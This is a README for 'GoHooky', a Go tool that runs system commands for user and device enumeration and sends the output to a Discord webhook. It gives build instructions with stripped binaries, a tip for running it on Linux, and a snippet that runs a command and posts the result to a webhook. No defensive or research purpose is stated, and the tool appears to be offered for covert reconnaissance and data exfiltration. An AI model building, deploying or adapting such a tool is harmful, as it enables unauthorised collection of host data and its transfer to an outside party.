# GoHooky

A simple Go application that executes system commands, for user and device enumeration, and sends the output to Discord via webhooks.

## Features

- Executes Windows command-line commands
- Sends command output to Discord using webhooks
- Supports JSON-formatted message content
- Error handling for both command execution and Discord communication

## Prerequisites

- Go installed on your system
- A Discord webhook URL
- Windows operating system (for current implementation)

## Installation

1. Clone the repository.
2. Navigate to the project directory.
3. Replace `<ENTERWEBHOOKURL>` with your actual Discord webhook's URL.
3. Run `go build -ldflags "-s -w" main.go` to compile.

## Usage

The application provides two main functions:

- `runCommand(cmd string)`: Executes a Windows command and returns its output
- `sendToDiscord(webhookURL string, message string)`: Sends a message to a Discord channel via webhook

*Note: If you want to make this run on a Linux host, change `exec.Command("cmd", "/C", cmd)` to `exec.Command("bash", "-c", cmd)` on Line 19.*

Example usage in code:

```go
output, err := runCommand("dir")
if err != nil {
    log.Fatal(err)
}

err = sendToDiscord("your-webhook-url", output)
if err != nil {
    log.Fatal(err)
}

